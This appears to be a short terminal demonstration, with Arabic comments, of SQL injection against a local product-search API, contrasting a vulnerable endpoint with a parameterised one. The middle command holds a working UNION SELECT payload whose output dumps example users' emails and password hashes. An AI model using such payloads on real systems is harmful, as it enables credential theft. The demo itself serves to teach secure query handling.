# بحث عادي
$ curl -s -G localhost:8000/api/unsafe/products -H 'Accept: application/json' --data-urlencode "q=عدة الروبوت" | jq -c
[{"name":"عدة الروبوت","price":45000}]
# البحث نفسه، وفي المدخل SQL
$ curl -s -G localhost:8000/api/unsafe/products -H 'Accept: application/json' --data-urlencode "q=x' UNION SELECT email || ' ' || password, 0 FROM users --" | jq -c '.[]'
{"name":"sara@example.com $2y$12$Ecameueo1aGGsjtuqrFRVOSgTugX/TKH6EJBRI554JfGsLZHwkiji","price":0}
{"name":"omar@example.com $2y$12$YAueROVZ6nLvaOsYAIhhJu3W1QI1OHBej8ZIzB3fm9FlWBcLUfEj.","price":0}
# المدخل نفسه، بصفة ربط
$ curl -s -G localhost:8000/api/products -H 'Accept: application/json' --data-urlencode "q=x' UNION SELECT email || ' ' || password, 0 FROM users --" | jq -c
[]
